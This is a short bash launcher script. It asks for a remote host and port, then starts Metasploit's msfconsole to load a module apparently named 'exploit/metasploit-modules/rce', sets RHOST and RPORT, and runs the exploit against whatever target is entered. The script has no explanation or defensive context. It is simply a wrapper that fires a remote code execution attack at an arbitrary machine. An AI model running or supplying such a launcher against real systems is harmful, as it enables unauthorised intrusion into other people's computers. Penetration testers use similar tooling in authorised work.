#!/bin/bash


read -p "[ set rhost ] > " rhost

read -p "[ set rport ] > " rport

msfconsole -q -x "use exploit/metasploit-modules/rce; set RHOST $rhost; set RPORT $rport; exploit"





















